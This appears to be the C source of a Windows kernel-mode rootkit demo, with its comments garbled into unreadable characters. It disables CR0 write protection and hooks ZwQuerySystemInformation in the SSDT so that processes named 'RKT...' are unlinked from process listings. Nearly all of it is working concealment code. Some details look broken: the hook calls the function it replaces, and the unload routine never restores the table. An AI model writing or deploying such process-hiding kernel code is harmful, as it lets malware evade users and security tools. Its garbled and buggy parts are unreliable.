/**
 * չʾ����
 * ���ؽ���demo��
 * ͨ��hook SSDT��ʽʵ��
 * ��ZwQuerySystemInformation()ϵͳ���ý���hook
 */

#include <ntddk.h>
#include <windef.h>



typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8
}SYSTEM_INFORMATION_CLASS;


#define SystemProcessInformation 5
#define SystemProcessorPerformanceInformation 8

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
);

typedef NTSTATUS (*ZwQuerySystemInformationPtr)(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength
	);

//ZwQuerySystemInformation()��Ҫ�������ṹ���������
typedef struct _SYSTEM_PROCESS_INFO {
	ULONG NextEntryOffset;   //��һ���ṹ��ĵ�ַ
	ULONG NumberOfThreads;   //���̵��߳���
	
	ULONG  Reserved[6];
	LARGE_INTEGER CreatedTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	HANDLE UniqueProceessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE  Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
}SYSTEM_PROCESS_INFO,*PSYSTEM_PROCESS_INFO;

typedef struct _SYSTEM_PROCESSOR_PERFORMANCE_INFO {
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER Reserved1[2];
	ULONG Reserved2;
}SYSTEM_PROCESSOR_PERFORMANCE_INFO,*PSYSTEM_PROCESSOR_PERFORMANCE_INFO;

//�ж��Ƿ�����ش˽���  1��ʾ��Ҫ����  0 ��ʾ����Ҫ����
int shouldHide(PSYSTEM_PROCESS_INFO systeminfo) {
	//�����ж�
	if (memcmp((*systeminfo).ProcessName.Buffer, L"RKT", 10) == 0)
		return 1;
	return 0;
}

//�滻����
NTSTATUS newZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength) 
{
	NTSTATUS ntStatus;
	PSYSTEM_PROCESS_INFO cSPI;//��ǰ������Ϣ
	PSYSTEM_PROCESS_INFO pSPI;//��һ���ṹ��

	ntStatus = ((ZwQuerySystemInformationPtr)(ZwQuerySystemInformation))(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (!NT_SUCCESS(ntStatus)) {
		return(ntStatus);
	}
	if (SystemInformationClass != SystemProcessInformation) {
		return ntStatus;
	}
	cSPI = (PSYSTEM_PROCESS_INFO)SystemInformation;
	pSPI = NULL;
	while (cSPI != NULL) {
		if ((*cSPI).ProcessName.Buffer != NULL) {
			//�ж��Ƿ�Ϊ��Ҫ���صĽ�����
			if (shouldHide(cSPI)) {
				//��ǰ�Ľ��̲��ǵ�һ��  ��һ������ʱpSPI��NULL
				if (pSPI != NULL) {
					//��ǰ���������һ��
					if ((*cSPI).NextEntryOffset == 0) {
						//������ǰһ���ĺ���ָ������  ����
						(*pSPI).NextEntryOffset = 0;
					}
					else {
						//ǰһ���ĺ���ָ��ƫ������
						(*pSPI).NextEntryOffset = (*pSPI).NextEntryOffset + (*cSPI).NextEntryOffset;
					}
				}
				else {//�ǵ�һ������
					if ((*cSPI).NextEntryOffset == 0) {//ֻ��һ������
						SystemInformation = NULL;
					}
					else {//��һ�����̵��������һ������,��SystemInformation����
						(BYTE*)SystemInformation = ((BYTE*)SystemInformation) + (*cSPI).NextEntryOffset;
					}
				}
			}
		}
		//�������������һ��������Ϣ
		pSPI = cSPI;
		if ((*cSPI).NextEntryOffset != 0) {
			(BYTE*)cSPI = ((BYTE*)cSPI) + (*cSPI).NextEntryOffset;
		}
		else {
			cSPI = NULL;
		}
	}
	return ntStatus;
}


//�����ؼ����ݽṹ�Ķ���
#pragma pack(1)
typedef struct  ServiceDescriptorEntry {
	DWORD *KiServiceTable;
	DWORD* CounterBaseTable;
	DWORD nSystemCalls;
	DWORD* KiArgumentTable;
}SDE,*PSDE;
#pragma pack()

typedef struct ServiceDescriptorTable {
	SDE ServiceDescriptor[4];
}SDT;

//ͨ������cr0�Ĵ�����WPλ���������߹ر�д����
VOID disableWP_cr0() {
	//0xfffeffff  -> 11111111 11111110 11111111 11111111
	__asm {
		PUSH EBX
		MOV EBX,cr0
		AND EBX,0xfffeffff
		MOV CR0,EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "disable write protection\n");
	return;
}

VOID enableWP_cr0() {
	__asm {
		PUSH EBX
		MOV EBX, cr0
		OR EBX,0x00010000
		MOV CR0, EBX
		POP EBX
	}
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "enable write protection\n");
	return;
}

//��ȡ����
DWORD getSSDTIndex(BYTE* address) {
	BYTE* addressOfIndex;
	DWORD indexValue;
	addressOfIndex = address + 1;
	indexValue = *((PULONG)addressOfIndex);
	return indexValue;
}

//  hook SSDT��
BYTE* hookSSDT(BYTE* oldAddr,BYTE* newAddr,DWORD *callTable) {
	PLONG target;
	DWORD indexValue;
	indexValue = getSSDTIndex(oldAddr);
	target = (PLONG) & (callTable[indexValue]);
	return ((BYTE*)InterlockedExchange(target, (LONG)newAddr));
}

VOID unHookSSDT(BYTE* oldAddr,BYTE* newAddr,DWORD* callTable) {
	PLONG target;
	DWORD indexValue;
	indexValue = getSSDTIndex(oldAddr);
	target = (PLONG) & (callTable[indexValue]);
	InterlockedExchange(target, (LONG)newAddr);
}



VOID Unload(IN PDRIVER_OBJECT DriverObject) {
	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver unLoading.\n");
	return;
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath) {

	DbgPrintEx(DPFLTR_IHVVIDEO_ID, DPFLTR_WARNING_LEVEL, "Driver running.\n");
	(*DriverObject).DriverUnload = Unload;

	__declspec(dllimport) SDE KeServiceDescriptorTable;
	PVOID callTable = KeServiceDescriptorTable.KiServiceTable;

	
	disableWP_cr0();

	hookSSDT(ZwQuerySystemInformation, newZwQuerySystemInformation, callTable);


	enableWP_cr0();


	return(STATUS_SUCCESS);
}
